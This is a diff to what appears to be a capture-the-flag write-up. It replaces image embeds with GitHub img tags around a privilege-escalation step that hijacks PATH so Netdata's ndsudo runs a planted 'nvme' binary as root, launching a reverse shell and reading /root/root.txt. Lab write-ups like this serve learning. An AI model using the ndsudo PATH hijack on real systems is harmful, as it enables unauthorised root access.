@@ -76,9 +76,12 @@ chmod +x nvme
 PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
 ```
 
-![[Zrzut ekranu 2025-08-17 163515.png]]
+<img width="687" height="663" alt="Zrzut ekranu 2025-08-17 163515" src="https://github.com/user-attachments/assets/3702081e-9e37-4ff9-a5f9-8947bd244c9c" />
 
 After execution, our reverse shell is launched and we get root via ndsudo
-And then just cat /root/root.txt and that’s it!
+And then just cat ```/root/root.txt``` and that’s it!
 
-![[Pasted image 20250817163802.png]]
+<img width="696" height="628" alt="Pasted image 20250817163802" src="https://github.com/user-attachments/assets/fb73627d-45ac-4ad6-9913-bb85a7545526" />
+
+
+
